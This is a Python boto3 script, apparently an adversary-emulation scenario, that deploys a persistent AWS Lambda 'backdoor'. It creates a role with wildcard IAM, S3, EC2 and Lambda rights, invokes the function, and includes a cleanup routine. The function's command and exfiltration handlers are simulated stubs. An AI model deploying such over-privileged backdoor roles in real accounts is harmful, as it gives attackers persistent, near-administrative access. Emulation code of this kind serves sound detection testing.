import boto3
import json
import base64
import time
import uuid

def run(profile=None, region=None):
    session_args = {}
    if profile:
        session_args['profile_name'] = profile
    if region:
        session_args['region_name'] = region
    session = boto3.Session(**session_args)
    
    lambda_client = session.client('lambda')
    iam_client = session.client('iam')
    apigateway_client = session.client('apigateway')
    events_client = session.client('events')
    function_name = f'backdoor-function-{uuid.uuid4().hex[:8]}'
    role_name = f'backdoor-role-{uuid.uuid4().hex[:8]}'
    policy_name = f'backdoor-policy-{uuid.uuid4().hex[:8]}'
    lambda_code = '''
import json
import boto3
import base64
import subprocess
import os

def lambda_handler(event, context):
    # Simulate backdoor functionality
    try:
        # Command execution simulation
        if 'command' in event:
            # In real scenario, this would execute system commands
            result = f"Simulated execution of: {event['command']}"
        
        # Data exfiltration simulation
        elif 'exfiltrate' in event:
            s3 = boto3.client('s3')
            buckets = s3.list_buckets()
            result = f"Found {len(buckets['Buckets'])} buckets for exfiltration"
        
        # Persistence check
        elif 'persist' in event:
            result = "Backdoor is active and persistent"
        
        else:
            result = "Backdoor activated - awaiting commands"
        
        return {
            'statusCode': 200,
            'body': json.dumps({
                'message': result,
                'function': context.function_name,
                'aws_region': os.environ.get('AWS_REGION', 'unknown')
            })
        }
    except Exception as e:
        return {
            'statusCode': 500,
            'body': json.dumps({'error': str(e)})
        }
'''
    
    trust_policy = {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Principal": {"Service": "lambda.amazonaws.com"},
                "Action": "sts:AssumeRole"
            }
        ]
    }
    
    backdoor_policy = {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Action": [
                    "logs:CreateLogGroup",
                    "logs:CreateLogStream",
                    "logs:PutLogEvents",
                    "s3:*",
                    "ec2:*",
                    "iam:*",
                    "lambda:*",
                    "apigateway:*",
                    "events:*"
                ],
                "Resource": "*"
            }
        ]
    }
    

    iam_client.create_role(
        RoleName=role_name,
        AssumeRolePolicyDocument=json.dumps(trust_policy),
        Description='Backdoor Lambda execution role'
    )
    

    iam_client.create_policy(
        PolicyName=policy_name,
        PolicyDocument=json.dumps(backdoor_policy),
        Description='Backdoor Lambda permissions'
    )
    
    account_id = session.client('sts').get_caller_identity()['Account']
    policy_arn = f'arn:aws:iam::{account_id}:policy/{policy_name}'
    
    iam_client.attach_role_policy(
        RoleName=role_name,
        PolicyArn=policy_arn
    )
    

    time.sleep(10)
    

    role_arn = f'arn:aws:iam::{account_id}:role/{role_name}'
    
    lambda_client.create_function(
        FunctionName=function_name,
        Runtime='python3.9',
        Role=role_arn,
        Handler='index.lambda_handler',
        Code={'ZipFile': lambda_code.encode()},
        Description='Malicious backdoor function',
        Timeout=300,
        MemorySize=256,
        Environment={
            'Variables': {
                'BACKDOOR_ACTIVE': 'true',
                'PERSISTENCE_METHOD': 'lambda'
            }
        }
    )

    test_payload = json.dumps({'persist': True})
    response = lambda_client.invoke(
        FunctionName=function_name,
        InvocationType='RequestResponse',
        Payload=test_payload
    )
    
    print(f"Lambda backdoor deployed: {function_name}")
    print(f"IAM role created: {role_name}")
    print(f"Test invocation status: {response['StatusCode']}")
    
    return {
        'scenario': 'lambda_backdoor',
        'function_name': function_name,
        'role_name': role_name,
        'policy_name': policy_name,
        'policy_arn': policy_arn,
        'role_arn': role_arn,
        'status': 'deployed'
    }

def cleanup(profile=None, region=None, function_name=None, role_name=None, policy_name=None):
    session_args = {}
    if profile:
        session_args['profile_name'] = profile
    if region:
        session_args['region_name'] = region
    session = boto3.Session(**session_args)
    
    lambda_client = session.client('lambda')
    iam_client = session.client('iam')
    
    cleanup_results = []
    

    if function_name:
        try:
            lambda_client.delete_function(FunctionName=function_name)
            cleanup_results.append(f"Deleted Lambda function: {function_name}")
        except Exception as e:
            cleanup_results.append(f"Error deleting Lambda function: {e}")

    if role_name and policy_name:
        try:
            account_id = session.client('sts').get_caller_identity()['Account']
            policy_arn = f'arn:aws:iam::{account_id}:policy/{policy_name}'
            
            iam_client.detach_role_policy(RoleName=role_name, PolicyArn=policy_arn)
            iam_client.delete_policy(PolicyArn=policy_arn)
            cleanup_results.append(f"Deleted IAM policy: {policy_name}")
        except Exception as e:
            cleanup_results.append(f"Error deleting IAM policy: {e}")

    if role_name:
        try:
            iam_client.delete_role(RoleName=role_name)
            cleanup_results.append(f"Deleted IAM role: {role_name}")
        except Exception as e:
            cleanup_results.append(f"Error deleting IAM role: {e}")
    
    for result in cleanup_results:
        print(result)
    
    return {'cleanup_results': cleanup_results}